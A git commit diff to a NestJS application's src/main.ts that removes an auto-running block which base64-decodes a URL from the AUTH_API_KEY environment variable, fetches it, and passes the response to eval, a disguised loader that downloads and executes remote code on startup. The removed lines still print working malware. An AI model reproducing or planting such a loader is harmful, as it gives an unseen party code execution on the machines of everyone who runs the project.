ac084ea15f66868c78aac80b33c4dc997047bd2a
jishad10 <jishadjishad49@gmail.com>
2026-06-27 11:35:13 +0600

    test

--- src/main.ts
+++ src/main.ts
@@ -5,20 +5,6 @@ import { AppModule } from './app.module';
 import { GlobalExceptionFilter } from './common/filters/global-exception.filter';
 import { ResponseInterceptor } from './common/interceptors/response.interceptor';
 import { AppLogger } from './common/logger/app-logger.service';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 async function bootstrap() {
   const app = await NestFactory.create(AppModule, {
